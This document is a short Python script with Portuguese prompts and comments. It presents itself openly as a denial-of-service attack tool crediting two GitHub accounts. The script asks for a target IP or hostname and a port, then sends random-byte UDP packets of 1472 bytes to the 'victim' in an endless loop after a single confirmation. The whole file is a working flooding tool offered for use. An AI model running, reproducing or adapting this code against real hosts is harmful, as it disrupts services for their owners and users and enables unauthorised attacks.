import socket, os, time, sys, ipaddress

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

os.system('cls' if os.name == 'nt' else 'clear')

print("Ferramenta de ataque DoS (Denial of Service)")
print("Github: https://github.com/Bartzin55")
print("Github: https://github.com/bella4424")

#entrada do IP
ip = input("\nIP de destino(Apenas IPv4) ou Hosname: ")

#entrada da porta
strport = input("Porta de destino: ")

#validação da porta
try:
    port = int(strport)
except(TypeError, ValueError):
    print("Porta inválida.")
    sys.exit()
if port < 0 or port > 65535:
    print("Porta inválida.")
    sys.exit()

#gera um pacote de bytes aleatórios, do tamanho especificado pelo user
packet = os.urandom(1472)
destination = (ip,port)
print("\n---------------")
print(f"REVISÃO\n\nIP de destino: {ip}\nPorta: {port}\n")

confirmation = input("Iniciar envio de pacotes (y): ")

if confirmation == "y" or confirmation == "Y":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"IP vítima: {ip}, porta: {port}")
    print("Iniciando, pare a qualquer momento com CONTROL+C...")
    time.sleep(5)

    packetcount = 1
    while True:
        print(f"Enviando {packetcount} pacotes de 1472 bytes para {ip}:{port}")
        packetcount = packetcount+1
        sock.sendto(packet, destination)

else:
    print("\nOPERAÇÃO CANCELADA")
    sys.exit()